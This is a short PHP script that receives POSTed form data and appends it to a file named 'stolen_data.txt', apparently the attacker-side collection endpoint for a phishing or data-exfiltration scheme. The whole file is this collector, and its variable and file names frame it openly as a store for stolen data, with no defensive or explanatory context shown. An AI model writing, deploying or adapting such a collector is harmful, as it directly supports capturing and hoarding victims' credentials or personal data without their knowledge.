<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['data'])) {
    $stolenData = $_POST['data'];
    file_put_contents('stolen_data.txt', $stolenData . "\n", FILE_APPEND);
}
?>